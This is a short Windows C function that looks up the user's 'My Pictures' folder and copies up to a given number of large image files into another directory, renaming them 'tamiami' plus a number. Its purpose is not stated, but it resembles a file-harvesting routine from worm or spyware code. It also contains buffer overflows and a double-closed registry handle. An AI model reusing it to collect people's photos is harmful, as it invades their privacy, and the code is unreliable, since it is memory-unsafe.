   unsigned GetPictures(char CopyToDirectory[], unsigned int NumberOfPictures)
   {
       HKEY            RegHandle;
       char            MyPicturesPath[MAX_PATH];
       DWORD           MyPicturesPathSize = sizeof(MyPicturesPath);
       HANDLE          FindHandle;
       WIN32_FIND_DATA Win32FindData;
       char            SuffixBuffer[3];
       char            TempBuffer[MAX_PATH];
       char            TempChar[3];
       unsigned int    PicturesCopyed = 0;
       HANDLE          SFileHandle;
       DWORD           SFileSize;

       NumberOfPictures--;

       if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 0, KEY_QUERY_VALUE, &RegHandle) == ERROR_SUCCESS)
       {
           if(RegQueryValueEx(RegHandle, "My Pictures", 0, 0, (BYTE *)MyPicturesPath, &MyPicturesPathSize) == ERROR_SUCCESS)
           {
               RegCloseKey(RegHandle);
               lstrcat(MyPicturesPath, "\\");

               if(SetCurrentDirectory(MyPicturesPath) != 0)
               {
                   FindHandle = FindFirstFile("*.*", &Win32FindData);

                   do
                   {
                           lstrcpyn(SuffixBuffer, Win32FindData.cFileName + lstrlen(Win32FindData.cFileName) - 3, 4);

                           if(lstrcmp(SuffixBuffer, "jpg") == 0 || lstrcmp(SuffixBuffer, "JPG") == 0 || lstrcmp(SuffixBuffer, "gif") == 0 || lstrcmp(SuffixBuffer, "GIF") == 0 || lstrcmp(SuffixBuffer, "png") == 0 || lstrcmp(SuffixBuffer, "PNG") == 0 || lstrcmp(SuffixBuffer, "bmp") == 0 || lstrcmp(SuffixBuffer, "BMP") == 0)
                           {
                               wsprintf(TempChar, "%d", PicturesCopyed);

                               lstrcpy(TempBuffer, CopyToDirectory);
                               lstrcat(TempBuffer, "tamiami");
                               lstrcat(TempBuffer, TempChar);

                               SFileHandle = CreateFile(Win32FindData.cFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

                               if(SFileHandle != INVALID_HANDLE_VALUE)
                               {
                                   SFileSize = GetFileSize(SFileHandle, 0);
                                   CloseHandle(SFileHandle);

                                   if(SFileSize < 20000) continue; //only pick up pictorys 20kb+
                               }

                               if(CopyFile(Win32FindData.cFileName, TempBuffer, 0) != 0) PicturesCopyed++;

                               if(NumberOfPictures == 0)
                               {
                                   CloseHandle(FindHandle);
                                   RegCloseKey(RegHandle);
                                   break;
                               }

                               NumberOfPictures--;
                           }
                   }
                   while(FindNextFile(FindHandle, &Win32FindData) != 0);

                   return PicturesCopyed;
               }
           }

           RegCloseKey(RegHandle);
       }

       return 0;
   }
